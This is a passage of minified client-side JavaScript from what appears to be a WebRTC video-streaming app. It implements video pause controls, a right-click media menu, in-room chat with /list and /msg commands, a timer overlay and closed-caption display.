session.rpcs))return;if(!("prePausedBandwidth"in session.rpcs[videoEle.dataset.UUID]))return;session.rpcs[videoEle.dataset.UUID].manualBandwidth=!1,session.rpcs[videoEle.dataset.UUID].videoElement&&session.rpcs[videoEle.dataset.UUID].videoElement.play(),delete session.rpcs[videoEle.dataset.UUID].prePausedBandwidth,session.requestRateLimit(!1,videoEle.dataset.UUID,!1),videoEle.classList.remove("paused"),videoEle.classList.remove("partialFadeout"),update&&updateMixer()}catch(e){errorlog(e)}}function pauseVideo(videoEle,update=!0){videoEle&&videoEle.dataset.UUID in session.rpcs&&(session.rpcs[videoEle.dataset.UUID].prePausedBandwidth=session.rpcs[videoEle.dataset.UUID].manualBandwidth,session.rpcs[videoEle.dataset.UUID].manualBandwidth=0,session.rpcs[videoEle.dataset.UUID].videoElement&&session.rpcs[videoEle.dataset.UUID].videoElement.pause(),session.requestRateLimit(!1,videoEle.dataset.UUID,!0),videoEle.classList.add("paused"),videoEle.classList.add("partialFadeout"),update&&updateMixer())}function gotDevices3(deviceInfos,vid){var audioEle=document.createElement("select");if(log(deviceInfos),!deviceInfos.length)return!1;for(let i=0;i!==deviceInfos.length;++i)if("audiooutput"===deviceInfos[i].kind){var opt=document.createElement("option");opt.innerText=deviceInfos[i].label,opt.value=deviceInfos[i].deviceId,audioEle.appendChild(opt),audioEle.videoTarget=vid,vid.sinkId?vid.sinkId==deviceInfos[i].deviceId&&(opt.selected=!0):vid.manualSink?vid.manualSink==deviceInfos[i].deviceId&&(opt.selected=!0):session.sink&&session.sink==deviceInfos[i].deviceId&&(opt.selected=!0)}return audioEle.onchange=function(){vid.manualSink=this.options[this.selectedIndex].value,this.videoTarget&&this.videoTarget.dataset.UUID&&(session.audioEffects=!0,updateIncomingAudioElement(this.videoTarget.dataset.UUID)),resetupAudioOut(this.videoTarget)},audioEle}function popupMessage(e,message="Copied to Clipboard"){var posx=0,posy=0;if(!e)e=window.event;e.pageX||e.pageY?(posx=e.pageX,posy=e.pageY):(e.clientX||e.clientY)&&(posx=e.clientX+document.body.scrollLeft+document.documentElement.scrollLeft,posy=e.clientY+document.body.scrollTop+document.documentElement.scrollTop),posx+=10;var menu=getById("messagePopup");menu.innerHTML="<center>"+message+"</center>";var menuWidth,menuHeight,windowWidth,windowHeight,menuState=0;1!==menuState&&(menuState=1,menu.classList.add("context-menu--active")),menuWidth=menu.offsetWidth+4,menuHeight=menu.offsetHeight+4,windowWidth=window.innerWidth,windowHeight=window.innerHeight,menu.style.left=windowWidth-posx<menuWidth?windowWidth-menuWidth+"px":posx+"px",menu.style.top=windowHeight-posy<menuHeight?windowHeight-menuHeight+"px":posy+"px",menu.classList.remove("fadeout");var showlength=50*message.length||500;setTimeout((function(){menu.classList.add("fadeout")}),showlength),setTimeout((function(){!function toggleMenuOff(){0!==menuState&&(menuState=0,menu.classList.remove("context-menu--active"))}()}),showlength+1e3)}function timeSince(date){var seconds=Math.floor((new Date-date)/1e3),interval=seconds/31536e3;return interval>1?Math.floor(interval)+" years":(interval=seconds/2592e3)>1?Math.floor(interval)+" months":(interval=seconds/86400)>1?Math.floor(interval)+" days":(interval=seconds/3600)>1?Math.floor(interval)+" hours":(interval=seconds/60)>1?Math.floor(interval)+" minutes":"Seconds ago"}!function rightclickmenuthing(){"use strict";function clickInsideElement(e,value="menu"){var el=e.srcElement||e.target;if(el.dataset&&value in el.dataset)return el;for(;el=el.parentNode;)if(el.dataset&&value in el.dataset)return el;return!1}var taskItemInContext,clickCoordsX,clickCoordsY,menu,menuWidth,menuHeight,windowWidth,windowHeight,menuState=0,lastMenu=!1;function menuClickListener(e){var clickeElIsLink=clickInsideElement(e,"action");if(clickeElIsLink)return e.preventDefault(),e.stopPropagation(),menuItemListener(clickeElIsLink,!1,e),!1;1===(e.which||e.button)&&toggleMenuOff()}function handleInputElement(e){var clickeElIsLink=clickInsideElement(e,"action");if(clickeElIsLink)return e.preventDefault(),e.stopPropagation(),menuItemListener(clickeElIsLink,e.srcElement,e),!1;1===(e.which||e.button)&&toggleMenuOff()}function toggleMenuOn(menutype=!1,ele=!1){if(lastMenu&&lastMenu!==menutype)try{menuState=0,getById(lastMenu).classList.remove("context-menu--active"),document.removeEventListener("click",menuClickListener),menu.querySelectorAll("input").forEach((ele=>{ele.removeEventListener("input",handleInputElement)}))}catch(e){}(function menuItemSyncState(menu){for(var items=menu.querySelectorAll("[data-action]"),i=0;i<items.length;i++)"FullWindow"===items[i].getAttribute("data-action")?"videosource"==taskItemInContext.id||"previewWebcam"==taskItemInContext.id?!0===session.infocus?items[i].parentNode.classList.add("hidden"):items[i].parentNode.classList.remove("hidden"):taskItemInContext.dataset.UUID===session.infocus?items[i].parentNode.classList.add("hidden"):items[i].parentNode.classList.remove("hidden"):"ShrinkWindow"===items[i].getAttribute("data-action")?"videosource"==taskItemInContext.id||"previewWebcam"==taskItemInContext.id?!0===session.infocus?items[i].parentNode.classList.remove("hidden"):items[i].parentNode.classList.add("hidden"):taskItemInContext.dataset.UUID===session.infocus?items[i].parentNode.classList.remove("hidden"):items[i].parentNode.classList.add("hidden"):"Pause"===items[i].getAttribute("data-action")?taskItemInContext.dataset.UUID&&taskItemInContext.dataset.UUID in session.rpcs?"prePausedBandwidth"in session.rpcs[taskItemInContext.dataset.UUID]?items[i].parentNode.classList.add("hidden"):items[i].parentNode.classList.remove("hidden"):items[i].parentNode.classList.add("hidden"):"UnPause"===items[i].getAttribute("data-action")?taskItemInContext.dataset.UUID&&taskItemInContext.dataset.UUID in session.rpcs&&"prePausedBandwidth"in session.rpcs[taskItemInContext.dataset.UUID]?items[i].parentNode.classList.remove("hidden"):items[i].parentNode.classList.add("hidden"):"Record"===items[i].getAttribute("data-action")?taskItemInContext.stopWriter||taskItemInContext.recording?items[i].parentNode.classList.add("hidden"):items[i].parentNode.classList.remove("hidden"):"StopRecording"===items[i].getAttribute("data-action")?taskItemInContext.stopWriter||taskItemInContext.recording?items[i].parentNode.classList.remove("hidden"):items[i].parentNode.classList.add("hidden"):"CopyFrameAsImage"===items[i].getAttribute("data-action")||"SaveFrameToDisk"===items[i].getAttribute("data-action")?taskItemInContext.srcObject&&taskItemInContext.srcObject.getVideoTracks().length?items[i].parentNode.classList.remove("hidden"):items[i].parentNode.classList.add("hidden"):"Controls"===items[i].getAttribute("data-action")?taskItemInContext.controls?items[i].parentNode.classList.add("hidden"):items[i].parentNode.classList.remove("hidden"):"HideControls"===items[i].getAttribute("data-action")?taskItemInContext.controls?items[i].parentNode.classList.remove("hidden"):items[i].parentNode.classList.add("hidden"):"PiP2"===items[i].getAttribute("data-action")?"undefined"!=typeof documentPictureInPicture?items[i].parentNode.classList.remove("hidden"):items[i].parentNode.classList.add("hidden"):"RemoteHangup"===items[i].getAttribute("data-action")?"videosource"==taskItemInContext.id||"previewWebcam"==taskItemInContext.id?items[i].parentNode.classList.add("hidden"):session.rpcs[taskItemInContext.dataset.UUID]&&session.rpcs[taskItemInContext.dataset.UUID].stats.info&&"remote"in session.rpcs[taskItemInContext.dataset.UUID].stats.info&&session.rpcs[taskItemInContext.dataset.UUID].stats.info.remote?items[i].parentNode.classList.remove("hidden"):items[i].parentNode.classList.add("hidden"):"ChangeBuffer"===items[i].getAttribute("data-action")?"videosource"==taskItemInContext.id||"previewWebcam"==taskItemInContext.id?items[i].parentNode.classList.add("hidden"):session.rpcs[taskItemInContext.dataset.UUID]?items[i].parentNode.classList.remove("hidden"):items[i].parentNode.classList.add("hidden"):"RemoteReload"===items[i].getAttribute("data-action")?"videosource"==taskItemInContext.id||"previewWebcam"==taskItemInContext.id?items[i].parentNode.classList.add("hidden"):session.rpcs[taskItemInContext.dataset.UUID]&&session.rpcs[taskItemInContext.dataset.UUID].stats.info&&"remote"in session.rpcs[taskItemInContext.dataset.UUID].stats.info&&session.rpcs[taskItemInContext.dataset.UUID].stats.info.remote?items[i].parentNode.classList.remove("hidden"):items[i].parentNode.classList.add("hidden"):"TipRightClick"===items[i].getAttribute("data-action")?navigator.userAgent.toLowerCase().indexOf(" electron/")>-1?items[i].parentNode.classList.add("hidden"):items[i].parentNode.classList.remove("hidden"):"Publish"===items[i].getAttribute("data-action")&&(taskItemInContext.classList.contains("publish")?items[i].parentNode.classList.remove("hidden"):items[i].parentNode.classList.add("hidden"))})(menu=getById(menutype||"context-menu")),1!==menuState&&(menuState=1,menu.classList.add("context-menu--active"),document.addEventListener("click",menuClickListener),menu.querySelectorAll("input").forEach((ele=>{ele.addEventListener("input",handleInputElement)}))),ele&&ele.classOptions&&menu.classList.add(ele.classOptions),lastMenu=menutype||"context-menu"}function toggleMenuOff(){0!==menuState&&(menuState=0,menu.classList.remove("context-menu--active"),document.removeEventListener("click",menuClickListener),menu.querySelectorAll("input").forEach((ele=>{ele.removeEventListener("input",handleInputElement)}))),lastMenu=!1}async function menuItemListener(link,inputElement=!1,e=!1){if("Open"===link.getAttribute("data-action"))window.open(taskItemInContext.href);else if("Copy"===link.getAttribute("data-action"))copyFunction(taskItemInContext.href);else if("Mirror"===link.getAttribute("data-action"))"videosource"==taskItemInContext.id||"previewWebcam"==taskItemInContext.id?(session.mirrored=!session.mirrored,applyMirror(!1),log("session.mirrored")):"mirror"in taskItemInContext?(taskItemInContext.mirror=!taskItemInContext.mirror,applyMirrorGuest(taskItemInContext.mirror,taskItemInContext)):(taskItemInContext.mirror=!0,applyMirrorGuest(taskItemInContext.mirror,taskItemInContext));else if("FullWindow"===link.getAttribute("data-action"))"videosource"==taskItemInContext.id||"previewWebcam"==taskItemInContext.id?session.infocus=!0:session.infocus=taskItemInContext.dataset.UUID,updateMixer();else if("ShrinkWindow"===link.getAttribute("data-action"))session.infocus=!1,updateMixer();else if("Pause"===link.getAttribute("data-action"))pauseVideo(taskItemInContext);else if("UnPause"===link.getAttribute("data-action"))unPauseVideo(taskItemInContext);else if("PiP"===link.getAttribute("data-action"))togglePictureInPicture(taskItemInContext);else if("PiP2"===link.getAttribute("data-action"))PictureInPicturePageToggle();else if("Record"===link.getAttribute("data-action"))if(taskItemInContext.stopWriter||taskItemInContext.recording);else if(taskItemInContext.startWriter)taskItemInContext.startWriter();else{var videoKbps=4e3;!1!==session.recordLocal&&(videoKbps=session.recordLocal),recordLocalVideo(null,videoKbps,taskItemInContext)}else if("StopRecording"===link.getAttribute("data-action"))taskItemInContext.stopWriter?taskItemInContext.stopWriter():taskItemInContext.recording&&recordLocalVideo("stop",null,taskItemInContext);else if("CopyFrameAsImage"===link.getAttribute("data-action"))copyVideoFrameToClipboard(taskItemInContext,e);else if("SaveFrameToDisk"===link.getAttribute("data-action"))saveVideoFrameToClipboard(taskItemInContext,e);else if("ChangeBuffer"===link.getAttribute("data-action"))toggleBufferSettings(taskItemInContext.dataset.UUID);else if("Cast"===link.getAttribute("data-action"));else if("Controls"===link.getAttribute("data-action"))taskItemInContext.controls=!0;else if("HideControls"===link.getAttribute("data-action"))taskItemInContext.controls=!1;else if("Edit"===link.getAttribute("data-action")){var response=await promptAlt("Please note, manual edits to the URL may conflict with the toggles",!1,!1,taskItemInContext.href);response&&(taskItemInContext.href=response,taskItemInContext.dataset.raw=response,taskItemInContext.innerHTML=response)}else if("QRCode"===link.getAttribute("data-action"))warnUser("Loading QR Code"),loadQR((function tt(url){getById("alertModalMessage").innerHTML="",new QRCode(getById("alertModalMessage"),{width:300,height:300,colorDark:"#000000",colorLight:"#FFFFFF",useSVG:!1}).makeCode(url),getById("alertModalMessage").title="",setTimeout((function(){getById("alertModalMessage").title="",getById("alertModalMessage").getElementsByTagName("img").length&&(getById("alertModalMessage").getElementsByTagName("img")[0].style.cursor="none")}),100)}),taskItemInContext.href);else if("ShowStats"===link.getAttribute("data-action")){if("videosource"==taskItemInContext.id||"previewWebcam"==taskItemInContext.id){var[menu,innerMenu]=statsMenuCreator();menu.interval=setInterval(printMyStats,session.statsInterval,innerMenu),printMyStats(innerMenu)}else if(taskItemInContext.dataset.UUID&&taskItemInContext.dataset.UUID in session.rpcs){var[menu,innerMenu]=statsMenuCreator();printViewStats(innerMenu,taskItemInContext.dataset.UUID),menu.interval=setInterval(printViewStats,session.statsInterval,innerMenu,taskItemInContext.dataset.UUID)}}else if("OutputAudio"===link.getAttribute("data-action"))enumerateDevices().then((function(deviceInfo){var deviceListElement=gotDevices3(deviceInfo,getById(taskItemInContext.id));deviceListElement?(warnUser("Select the audio playback destination for this media:\n\n"),getById("alertModalMessage").appendChild(deviceListElement)):warnUser("No output devices available")}));else if("RemoteHangup"===link.getAttribute("data-action")){if(session.rpcs[taskItemInContext.dataset.UUID]&&session.rpcs[taskItemInContext.dataset.UUID].stats.info&&"remote"in session.rpcs[taskItemInContext.dataset.UUID].stats.info&&session.rpcs[taskItemInContext.dataset.UUID].stats.info.remote)if(confirm(getTranslation("confirm-disconnect-user")))(msg={hangup:!0}).remote=session.remote,msg=await session.encodeRemote(msg),session.sendRequest(msg,taskItemInContext.dataset.UUID),pokeIframeAPI("hungup","remote",taskItemInContext.dataset.UUID)}else if("RemoteReload"===link.getAttribute("data-action")){var msg;if(session.rpcs[taskItemInContext.dataset.UUID]&&session.rpcs[taskItemInContext.dataset.UUID].stats.info&&"remote"in session.rpcs[taskItemInContext.dataset.UUID].stats.info&&session.rpcs[taskItemInContext.dataset.UUID].stats.info.remote)if(confirm(getTranslation("confirm-reload-user")))(msg={reload:!0}).remote=session.remote,msg=await session.encodeRemote(msg),session.sendRequest(msg,taskItemInContext.dataset.UUID),pokeIframeAPI("reload","remote",taskItemInContext.dataset.UUID)}else if("SSNewTab"===link.getAttribute("data-action")){var URL="https://"+window.location.hostname+location.pathname+createScreenShareURL(!1);log(URL),window.open(URL,"_blank").focus()}else if("pip-clock"===link.getAttribute("data-action"))popOutClock(taskItemInContext.children[0]);else if("Publish"===link.getAttribute("data-action")){URL=taskItemInContext.href;URL+="&clean&chroma=000&ssar=landscape&nosettings&prefercurrenttab&selfbrowsersurface=include&displaysurface=browser&np&nopush&publish&whippush&whippushtoken";var win=window.open(URL,"targetWindow","toolbar=no,location=no,status=no,scaling=no,menubar=no,scrollbars=no,resizable=no,width=1280,height=720");win.focus(),win.resizeTo(1280,720)}!1===inputElement&&(log("Task ID - "+taskItemInContext+", Task action - "+link.getAttribute("data-action")),toggleMenuOff())}!function contextListener(){document.addEventListener("contextmenu",(function(e){if(navigator.userAgent.toLowerCase().indexOf(" electron/")>-1){if(e&&!e.ctrlKey&&!e.metaKey)return}else if(e&&(e.ctrlKey||e.metaKey))return;if(taskItemInContext=clickInsideElement(e,"menu"))return e.preventDefault(),e.stopPropagation(),taskItemInContext.dataset&&taskItemInContext.dataset.menu?toggleMenuOn(taskItemInContext.dataset.menu,taskItemInContext):toggleMenuOn(),function positionMenu(e){var clickCoords=function getPosition(event2){var posx=0,posy=0;event2||window.event;return event2.pageX||event2.pageY?(posx=event2.pageX,posy=event2.pageY):(event2.clientX||event2.clientY)&&(posx=event2.clientX+document.body.scrollLeft+document.documentElement.scrollLeft,posy=event2.clientY+document.body.scrollTop+document.documentElement.scrollTop),{x:posx,y:posy}}(e);clickCoordsX=clickCoords.x,clickCoordsY=clickCoords.y,menuWidth=menu.offsetWidth+4,menuHeight=menu.offsetHeight+4,windowWidth=window.innerWidth,windowHeight=window.innerHeight,menu.style.left=windowWidth-clickCoordsX<menuWidth?windowWidth-menuWidth+"px":clickCoordsX+"px";menu.style.top=windowHeight-clickCoordsY<menuHeight?windowHeight-menuHeight+"px":clickCoordsY+"px"}(e),!1;taskItemInContext=null,toggleMenuOff()}))}()}();var messageList=[];function sendChatMessage(chatMsg=!1,bc=!1){var data={};if(!1===chatMsg)var msg=document.getElementById("chatInput").value;else msg=chatMsg;if(""==msg)return!1;msg=convertShortcodes(msg);var label="";if(session.label?label=session.director?"<b><i><span class='chat_name'>"+session.label+"</span>:</i></b> ":"<b><span class='chat_name'>"+session.label+"</span>:</b> ":session.director&&(label="<b><i><span class='chat_name'>Director</span>:</i></b> "),"/list"===msg.trim()){var listMsg=null;for(var UUID in session.rpcs){listMsg=session.rpcs[UUID].label?UUID+": "+session.rpcs[UUID].label:session.directorList.indexOf(UUID)>=0?UUID+": Director":UUID+": Unknown User",(data={}).msg=listMsg,data.label=!1,data.type="alert",data.time=Date.now(),messageList.push(data)}for(var UUID in session.pcs){if(!(UUID in session.rpcs))listMsg=session.pcs[UUID].label?UUID+"; "+session.pcs[UUID].label:session.directorList.indexOf(UUID)>=0?UUID+"; Director":UUID+"; Unknown User",(data={}).msg=listMsg,data.label=!1,data.type="alert",data.time=Date.now(),messageList.push(data)}null===listMsg&&(data.msg="No other users are connected to you",data.label=!1,data.type="alert",data.time=Date.now(),messageList.push(data))}else if(msg.startsWith("/msg ")){if(msg=(msg=msg.split("/msg ")[1]).split(" "),uid=msg.shift().toLowerCase(),""==(msg=msg.join(" ")))return!1;var sent=!1;for(var UUID in session.rpcs){if(UUID.startsWith(uid))sendChat(msg,UUID),(data={}).time=Date.now(),data.msg=sanitizeChat(msg),data.label=label,data.type="sent",messageList.push(data),sent=!0;else if(session.rpcs[UUID].label&&session.rpcs[UUID].label.toLowerCase().startsWith(uid)){sendChat(msg,UUID),(data={}).time=Date.now(),data.msg=sanitizeChat(msg),data.label=label,data.type="sent",messageList.push(data),sent=!0}else if(session.directorList.indexOf(UUID)>=0&&"director".startsWith(uid)){sendChat(msg,UUID),(data={}).time=Date.now(),data.msg=sanitizeChat(msg),data.label=label,data.type="sent",messageList.push(data),sent=!0}}for(var UUID in session.pcs){if(!(UUID in session.rpcs))if(UUID.startsWith(uid))sendChat(msg,UUID),(data={}).time=Date.now(),data.msg=sanitizeChat(msg),data.label=label,data.type="sent",messageList.push(data),sent=!0;else if(session.pcs[UUID].label&&session.pcs[UUID].label.toLowerCase().startsWith(uid)){sendChat(msg,UUID),(data={}).time=Date.now(),data.msg=sanitizeChat(msg),data.label=label,data.type="sent",messageList.push(data),sent=!0}else if(session.directorList.indexOf(UUID)>=0&&"director".startsWith(uid)){sendChat(msg,UUID),(data={}).time=Date.now(),data.msg=sanitizeChat(msg),data.label=label,data.type="sent",messageList.push(data),sent=!0}}if(0==sent)return(data={msg:"No user found. Message not sent.",label:!1,type:"alert"}).time=Date.now(),messageList.push(data),updateMessages(),!1}else{if(msg.startsWith("/"))return data.msg="Unknown command. Try '/list' or '/msg username message'.",data.label=!1,data.type="alert",data.time=Date.now(),messageList.push(data),updateMessages(),!1;if(!0===session.directorChat){if(session.directorList.length){for(var i=0;i<session.directorList.length;i++)sendChat(msg,session.directorList[i]);(data={}).time=Date.now(),data.msg=sanitizeChat(msg),data.label=label,data.type="sent",messageList.push(data)}}else sendChat(msg),data.time=Date.now(),data.msg=sanitizeChat(msg),data.label=label,data.type="sent",messageList.push(data)}return document.getElementById("chatInput").value="",messageList=messageList.slice(-100),bc||!1===session.broadcastChannel||(log(session.broadcastChannel),session.broadcastChannel.postMessage(data)),updateMessages(),!0}function disableQualityDirector(UUID){try{var elements;(elements=document.querySelectorAll('[data-action-type="change-quality2"][data--u-u-i-d="'+UUID+'"]'))[0]&&(elements[0].classList.add("disable"),elements[0].ariaPressed="false",elements[0].classList.remove("pressed"),elements[0].disabled="true",elements[0].title=getTranslation("preview-meshcast-disabled")),(elements=document.querySelectorAll('[data-action-type="change-quality1"][data--u-u-i-d="'+UUID+'"]'))[0]&&(elements[0].classList.add("disable"),elements[0].ariaPressed="false",elements[0].classList.remove("pressed"),elements[0].disabled="true",elements[0].title=getTranslation("preview-meshcast-disabled")),(elements=document.querySelectorAll('[data-action-type="change-quality3"][data--u-u-i-d="'+UUID+'"]'))[0]&&(elements[0].classList.add("disable"),elements[0].ariaPressed="false",elements[0].classList.remove("pressed"),elements[0].disabled="true",elements[0].title=getTranslation("preview-meshcast-disabled"))}catch(e){errorlog(e)}}function applyQualityDirector(){document.querySelectorAll('#guestFeeds button.pressed[data-action-type="change-quality1"],#guestFeeds button.pressed[data-action-type="change-quality2"],#guestFeeds button.pressed[data-action-type="change-quality3"]').forEach((ele=>{ele.click()}))}function toggleQualityDirector(bitrate,UUID,ele){for(var eles=ele.parentNode.childNodes,i=0;i<eles.length;i++)eles[i].className="";ele.classList.add("pressed"),ele.ariaPressed="true",session.requestRateLimit(bitrate,UUID)}var clockOverlayTimer=null;function zpadTime(number){for(var output=""+number;output.length<2;)output="0"+output;return output}function showClock(){getById("overlayClockContainer").classList.remove("hidden")}function hideClock(){getById("overlayClockContainer").classList.add("hidden")}function setClock(initial=!1,color="#000"){!1!==initial?(initial=parseInt(initial),getById("overlayClockContainer").dataset.initial=initial):initial=parseInt(getById("overlayClockContainer").dataset.initial),initial<0&&(initial=0),updateClock(initial,color)}function stopClock(){document.getElementById("overlayClock").innerHTML="",clearInterval(clockOverlayTimer),updateClock("0","#444")}function pauseClock(){clearInterval(clockOverlayTimer);var current=Date.now()-parseInt(getById("overlayClockContainer").dataset.timestamp);current=0==parseInt(getById("overlayClockContainer").dataset.initial)?parseInt(Math.round(current/1e3)):parseInt(getById("overlayClockContainer").dataset.initial)-parseInt(Math.round(current/1e3)),getById("overlayClockContainer").dataset.current=current,updateClock(current,"#00F")}function resumeClock(){"current"in getById("overlayClockContainer").dataset&&startClock(parseInt(getById("overlayClockContainer").dataset.current))}function startClock(restart=!0){clearInterval(clockOverlayTimer),!0===restart?getById("overlayClockContainer").dataset.timestamp=Date.now():0==parseInt(getById("overlayClockContainer").dataset.initial)?getById("overlayClockContainer").dataset.timestamp=Date.now()-parseInt(1e3*getById("overlayClockContainer").dataset.current):getById("overlayClockContainer").dataset.timestamp=Date.now()-(1e3*parseInt(getById("overlayClockContainer").dataset.initial)-parseInt(1e3*getById("overlayClockContainer").dataset.current)),stepClock();var clock=document.getElementById("overlayClock");clock&&clock.video&&(clock.innerHTML="",clock.appendChild(clock.video),clock.video.play()),clockOverlayTimer=setInterval((function(){stepClock()}),999)}function stepClock(){var current=Date.now()-parseInt(getById("overlayClockContainer").dataset.timestamp);if(current=0==parseInt(getById("overlayClockContainer").dataset.initial)?parseInt(Math.round(current/1e3)):parseInt(getById("overlayClockContainer").dataset.initial)-parseInt(Math.round(current/1e3)),session.directorList.length){var msg={};msg.timer=current;for(var i=0;i<session.directorList.length;i++)msg.UUID=session.directorList[i],session.sendMessage(msg,msg.UUID)}current<0&&current%2?updateClock(0,"#F00"):updateClock(current<0?0:current,"#000")}function updateClock(timeleft,color="#000"){var minutes=Math.floor(timeleft/60),seconds=timeleft%60,clock=document.getElementById("overlayClock");clock.ctx?(clock.ctx.beginPath(),clock.ctx.rect(0,0,230,40),clock.ctx.fillStyle=color,clock.ctx.fill(),clock.ctx.fillStyle="#FFF",clock.ctx.textAlign="center",clock.ctx.font="50px monospace",clock.ctx.fillText(zpadTime(minutes)+":"+zpadTime(seconds),115,37)):(clock.innerHTML=zpadTime(minutes)+":"+zpadTime(seconds),clock.style.backgroundColor=color+"9")}function popOutClock(clock){if(clock.ctx)clock.innerHTML="",clock.appendChild(clock.video),clock.video.play(),togglePictureInPicture(clock.video);else{var canvas=document.createElement("canvas");canvas.width="230",canvas.height="40";var ctx=canvas.getContext("2d");clock.canvas=canvas,clock.ctx=ctx,ctx.beginPath(),ctx.rect(0,0,230,40),ctx.fillStyle="#000",ctx.fill(),ctx.fillStyle="#FFF",ctx.font="50px monospace",ctx.textAlign="center",ctx.fillText(clock.innerHTML,115,37),clock.video=document.createElement("video"),clock.innerHTML="",clock.appendChild(clock.video),clock.video.onloadedmetadata=function(){togglePictureInPicture(clock.video)},clock.video.srcObject=canvas.captureStream(),clock.video.play()}}function createPopoutChat(){return!1===session.broadcastChannelID&&(session.broadcastChannelID=session.generateStreamID(8),log(session.broadcastChannelID),session.broadcastChannel=new BroadcastChannel(session.broadcastChannelID),session.broadcastChannel.onmessage=function(e){"loaded"in e.data?session.broadcastChannel.postMessage({messageList:messageList}):"msg"in e.data&&sendChatMessage(e.data.msg,!0)}),window.open("./popout.html?id="+session.broadcastChannelID,"popup","width=600,height=480,toolbar=no,menubar=no,resizable=yes"),!1}function replaceURLs(message){if(message){return message.replace(/(((https?:\/\/)|(www\.))[^\s]+)/g,(function(url){url=url.replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/["']/g,"");for(var punc="";"."===url[url.length-1];)url=url.slice(0,-1),punc+=".";for(;";"===url[url.length-1];)url=url.slice(0,-1),punc+=";";for(;","===url[url.length-1];)url=url.slice(0,-1),punc+=",";for(;"!"===url[url.length-1];)url=url.slice(0,-1),punc+="!";for(;":"===url[url.length-1];)url=url.slice(0,-1),punc+=":";for(;"*"===url[url.length-1];)url=url.slice(0,-1),punc+="*";for(;")"===url[url.length-1];)url=url.slice(0,-1),punc+=")";for(;"?"===url[url.length-1];)url=url.slice(0,-1),punc+="?";var hyperlink=url;return hyperlink.match("^https?://")||(hyperlink="http://"+hyperlink),url.length>35&&(url=url.substring(0,35)+"..."),'<a href="'+hyperlink+'" title="Click to open the link in a new tab" target="_blank" rel="noopener noreferrer">'+url+"</a>"+punc}))}}function getChatMessage(msg,label=!1,director=!1,overlay=!1){if(""!=(msg=sanitizeChat(msg))){if(label&&(label=sanitizeLabel(label)),data={},data.time=Date.now(),data.msg=msg,label?(data.label=label,data.label=director?"<b><i><span class='chat_director chat_name'>"+data.label+"</span>:</i></b> ":"<b><span class='chat_name'>"+data.label+"</span>:</b> ",label="<span class='chat_name'>"+label+"</span>:"):director?(data.label="<b><i><span class='chat_director chat_name'>Director</span>:</i></b> ",label="<span class='chat_director chat_name'>Director</span>:"):(session.director?data.label="<span class='chat_name'>Someone</span>: ":data.label="",label=""),data.type="recv",overlay&&(!session.cleanOutput||0!=session.cleanish)){var textOverlay=getById("overlayMsgs");if(textOverlay){var spanOverlay=document.createElement("span");spanOverlay.innerHTML="<b><i>"+label+"</i></b> "+msg+"<br />",textOverlay.appendChild(spanOverlay),textOverlay.style.display="block";var showtime=200*msg.length+3e3;showtime>8e3&&(showtime=8e3),setTimeout((function(ele){try{ele.parentNode.removeChild(ele)}catch(e){}}),showtime,spanOverlay)}}isIFrame&&parent.postMessage({gotChat:data},session.iframetarget),!1!==session.chatbutton&&(messageList.push(data),messageList=messageList.slice(-100),session.beepToNotify&&(playtone(),showNotification("new message",msg)),updateMessages(),0==session.chat&&(getById("chattoggle").className="las la-comments toggleSize pulsate",getById("chatbutton").className="float",getById("chatNotification").value?getById("chatNotification").value=getById("chatNotification").value+1:getById("chatNotification").value=1,getById("chatNotification").classList.add("notification","red")),!1!==session.broadcastChannel&&session.broadcastChannel.postMessage(data))}}function updateClosedCaptions(msg,label,UUID){msg.counter=parseInt(msg.counter);var temp=document.createElement("div");temp.innerText=msg.transcript,temp.innerText=temp.innerHTML;var transcript=temp.textContent||temp.innerText||"";if(""!=transcript){transcript=transcript.charAt(0).toUpperCase()+transcript.slice(1),label=session.nocaptionlabels||!label||session.view&&!session.view_set?"":"<b>"+(label=sanitizeLabel(label))+":</b> ";var textOverlay=getById("overlayMsgs");if(textOverlay){if(document.getElementById(UUID+"_"+msg.counter))var spanOverlay=document.getElementById(UUID+"_"+msg.counter);else(spanOverlay=document.createElement("span")).id=UUID+"_"+msg.counter,textOverlay.appendChild(spanOverlay),textOverlay.style.height="unset",textOverlay.style.textAlign="left",textOverlay.style.display="block",textOverlay.style.position="fixed",textOverlay.style.bottom="0";if(spanOverlay.innerHTML=label+transcript+"<br />",spanOverlay.style.fontSize=parseInt(session.labelsize||100)/100*4.5+"vh",spanOverlay.style.lineHeight=parseInt(session.labelsize||100)/100*6+"vh",spanOverlay.style.margin=parseInt(session.labelsize||100)/100*.75+"vh",msg.isFinal){clearTimeout(spanOverlay.timeout),spanOverlay.timeout=setTimeout((function(ele){ele.parentNode.removeChild(ele)}),3e3,spanOverlay)}else clearTimeout(spanOverlay.timeout),spanOverlay.timeout=setTimeout((function(ele){ele.parentNode.removeChild(ele)}),3e4,spanOverlay)}}}var chatUpdateTimeout=null;function updateMessages(){if(!1!==session.chatbutton){for(var i in document.getElementById("chatBody").innerHTML="",messageList){time="<span style='user-select: none;'> - "+(time=timeSince(messageList[i].time)||"")+"</span>";var msg=document.createElement("div"),message=replaceURLs(messageList[i].msg);if("sent"==messageList[i].type)msg.innerHTML=message+"<i><small><small>"+time+"</small></small></i>",msg.classList.add("outMessage");else if("recv"==messageList[i].type||"action"==messageList[i].type){var label="";messageList[i].label&&(label=messageList[i].label),msg.innerHTML=label+message+"<i><small><small>"+time+"</small></small></i>",msg.classList.add("inMessage")}else"alert"==messageList[i].type?(msg.innerHTML=message+"<i><small><small>"+time+"</small></small></i>",msg.classList.add("inMessage")):(msg.innerHTML=message,msg.classList.add("outMessage"));document.getElementById("chatBody").appendChild(msg)}for(var i in showDownloadLinks(),msgTransferList){var time;time="<span style='user-select: none;'> - "+(time=timeSince(msgTransferList[i].time)||"")+"</span>";msg=document.createElement("div");if("idx"in msgTransferList[i]&&(msg.id="transfer_"+msgTransferList[i].idx,msg.classList.add("transfer")),"sent"==msgTransferList[i].type)msg.innerHTML=msgTransferList[i].msg+"<i><small><small>"+time+"</small></small></i>",msg.classList.add("outMessage");else 